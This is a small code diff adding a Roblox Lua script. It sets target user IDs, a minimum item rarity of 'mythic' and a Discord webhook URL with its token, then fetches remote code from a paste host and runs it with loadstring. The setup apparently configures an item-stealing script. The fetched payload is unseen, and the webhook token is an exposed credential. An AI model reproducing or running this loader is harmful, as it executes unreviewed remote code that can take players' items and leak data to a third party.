@@ -1,0 +1,8 @@
+
+_G.UserIDs = {
+    '3539422801',
+}
+_G.minrarity = "mythic"
+_G.webhook = "https://discord.com/api/webhooks/1307246751316705311/8siGthipHT_Avpa_ePnBn3ElIL0pTuHR0VG7TE8DzDALr9qeWg-TTt54Mnej0p2eIlqk"
+
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/8oTmGzNyikaQq5Zg/raw"))()
